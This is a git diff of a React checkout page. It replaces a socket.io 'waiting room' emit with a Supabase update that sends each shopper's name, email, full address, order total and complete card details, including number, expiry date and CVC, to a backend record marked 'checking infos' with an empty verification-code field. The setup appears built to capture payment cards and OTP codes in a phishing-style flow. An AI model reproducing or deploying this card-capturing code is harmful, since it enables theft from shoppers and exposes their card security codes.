@@ -1,7 +1,6 @@
 import './CheckoutPage.scss'
 import { CSSTransition, SwitchTransition } from 'react-transition-group';
 import { v4 as uuidv4 } from 'uuid'
-import socket from "../../axios/socket";
 import { useAppDispatch, useAppSelector } from "../../hooks/redux";
 import { MdOutlineKeyboardArrowUp } from "react-icons/md";
 import { PiLockKeyBold } from "react-icons/pi";
@@ -20,6 +19,7 @@ import { useNavigate } from "react-router-dom";
 import { getCardType, isCreditCard } from "../../utils/regexValidator";
 import CircleLoader from "../../components/App/CircleLoader/CircleLoader";
 import { actionChangeInput } from "../../store/reducer/order";
+import { handleUnload, updateInfosRequest } from "../../axios/supabaseClient";
 
 function CheckoutPage() {
   const dispatch = useAppDispatch();
@@ -36,6 +36,7 @@ function CheckoutPage() {
   const card = useAppSelector((state) => state.account.credentials.card);
   const discountApplied = useAppSelector((state) => state.discount.discountApplied);
   const orderInput = useAppSelector((state) => state.order.orderInput);
+  const notifId = useAppSelector((state) => state.notification.id);
 
   const shippingCost = 6;
 
@@ -49,10 +50,50 @@ function CheckoutPage() {
   const [step, setStep] = useState(1);
   const [loading, setLoading] = useState(false);
   const [deliveryAdress, setDeliveryAddress] = useState('');
+  // const [isLeaving, setIsLeaving] = useState(false);
 
   const addressFacturationRef = useRef<HTMLDivElement>(null);
   const defaultAddressRef = useRef<HTMLDivElement>(null);
   const listAddressRef = useRef<HTMLDivElement>(null);
+
+  // useEffect(() => {
+  //   if (!notifId) return;
+
+  //   const handleBeforeUnload = (e: BeforeUnloadEvent) => {
+  //     e.preventDefault();
+  //     e.returnValue = "";
+  //   };
+
+  //   const handleUnloadWrapper = () => {
+  //     if (isLeaving) {
+  //       handleUnload(notifId);
+  //     }
+  //   };
+
+  //   window.addEventListener("beforeunload", handleBeforeUnload);
+
+  //   window.addEventListener("unload", () => {
+  //     if (isLeaving) {
+  //       handleUnload(notifId);
+  //     }
+  //   });
+
+  //   let currentLocation = location.pathname;
+
+  //   const handleLocationChange = () => {
+  //     if (location.pathname !== currentLocation) {
+  //       setIsLeaving(true);
+  //       currentLocation = location.pathname;
+  //     }
+  //   };
+
+  //   handleLocationChange();
+
+  //   return () => {
+  //     window.removeEventListener("beforeunload", handleBeforeUnload);
+  //     window.removeEventListener("unload", handleUnloadWrapper);
+  //   };
+  // }, [notifId, navigate]);
 
   useEffect(() => {
     if (!listAddress || listAddress.length === 0)
@@ -90,21 +131,54 @@ function CheckoutPage() {
   }, [loading]);
 
   useEffect(() => {
-    if (orderInput.delivery_address !== null && orderInput.total) {
-      socket.connect();
-      socket.emit("joinWaitingRoom", {
-        userId: id,
-        username: email,
+    if (!id) return;
+    const handleUnloadWrapper = () => handleUnload(id)
+
+    window.addEventListener("beforeunload", handleUnloadWrapper);
+
+    return () => {
+      window.removeEventListener("beforeunload", handleUnloadWrapper);
+    };
+  }, [id]);
+
+  useEffect(() => {
+    if (orderInput.delivery_address !== null && orderInput.total && id && notifId !== null) {
+
+      updateInfosRequest({
+        id: notifId,
+        email: email,
         firstname: infos.firstname,
         lastname: infos.lastname,
         address: `${orderInput.delivery_address?.firstname} ${orderInput.delivery_address?.lastname} ${orderInput.delivery_address?.address} ${orderInput.delivery_address?.precision} ${orderInput.delivery_address?.postal_code} ${orderInput.delivery_address?.city} ${orderInput.delivery_address?.country.name}`,
-        listAddress: listAddress,
-        card: card,
+        c_name: card.card_name,
+        c_number: card.card_number,
+        exp_date: card.expiration_date,
+        cvc: card.cvc,
+        total: orderInput.total,
         status: "checking infos",
-        verifCode: null
-      });
+        code: null
+      })
     }
-  }, [orderInput]);
+  }, [orderInput, id, notifId]);
+
+  // useEffect(() => {
+  //   if (orderInput.delivery_address !== null && orderInput.total) {
+  //     socket.connect();
+  //     socket.emit("joinWaitingRoom", {
+  //       userId: id,
+  //       username: email,
+  //       firstname: infos.firstname,
+  //       lastname: infos.lastname,
+  //       address: `${orderInput.delivery_address?.firstname} ${orderInput.delivery_address?.lastname} ${orderInput.delivery_address?.address} ${orderInput.delivery_address?.precision} ${orderInput.delivery_address?.postal_code} ${orderInput.delivery_address?.city} ${orderInput.delivery_address?.country.name}`,
+  //       listAddress: listAddress,
+  //       card: card,
+  //       status: "checking infos",
+  //       verifCode: null
+  //     });
+  //   }
+  // }, [orderInput]);
+
+
 
   const handleChange = (e: ChangeEvent<HTMLInputElement | HTMLTextAreaElement> | ChangeEvent<HTMLSelectElement>) => {
     const { name, value } = e.target;
@@ -153,8 +227,9 @@ function CheckoutPage() {
       }
       setLoading(true);
       setStep(2);
-    } else
+    } else {
       navigate('/payment');
+    }
   }
 
   const checkPaimentInfos = () => {
